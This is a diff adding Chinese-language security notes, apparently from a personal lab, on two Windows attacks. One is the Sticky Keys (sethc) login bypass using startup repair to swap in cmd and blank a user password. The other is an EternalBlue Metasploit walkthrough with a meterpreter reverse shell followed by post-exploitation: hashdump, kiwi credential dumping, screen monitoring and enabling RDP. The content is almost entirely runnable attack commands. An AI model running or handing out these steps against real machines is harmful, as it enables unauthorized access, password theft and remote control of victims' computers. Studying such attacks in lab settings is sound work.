@@ -319,7 +319,51 @@ color 0a # 修改cmd窗口颜色
 
 ## 0001 5次shift漏洞
 
+```bash
+# 唤醒程序路径：C:\Windows\System32\sethc
+# 复现方法：先关机重启，看到windows图标，直接在VM上关闭客户机（模拟开机时断断电源操作），再重启虚拟机，一定要看到“启动启动修复（推荐）”，回车；取消还原，查看“隐藏问题详细信息”，打开“X:\windows\system32\zh-CN\erofflps.txt”，在记事本中文件>打开，文件类型选择所有文件，将sethc修改为sethce，将cmd复制一份并修改为sethc，之后关闭窗口点击完成关机，再开机，点击用户登陆，按5次shift按键，在CMD窗口执行net user username ""，设置无密码即可登录。
+```
+
+![sethc](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114649243.png)
+
+![5次shift漏洞](https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114952907.png)
+
+
+
 
 
 ## 0002 永恒之蓝
+
+
+
+```bash
+sudo nmap -sS -p 445 192.168.112.0/24 > p_445
+
+cat p_445 | grep -E "Nmap|open"
+
+# 
+msfconsole
+  search ms17_010
+  use auxiliary/scanner/smb/smb_ms17_010
+  use exploit/windows/smb/ms17_010_eternalblue\
+    set rhost 192.168.112.128 # 设置靶机
+    set lhost 192.168.112.130 # 设置本机IP
+    set payload windows/x64/meterpreter/reverse_tcp
+    run # 开始攻击
+
+## 攻击成功后的操作
+screenshot # 截图
+screenshare # 实时监控屏幕
+# 查看密码
+hashdump
+load kiwi
+ps -S "csrss"
+migrate 344
+creds_all
+shell # 登陆到win7
+chcp 65001 # 消除乱码
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # 远程
+netstat -an # 查看端口
+sudo rdesktop 192.168.112.128 # 发起远程
+```
 
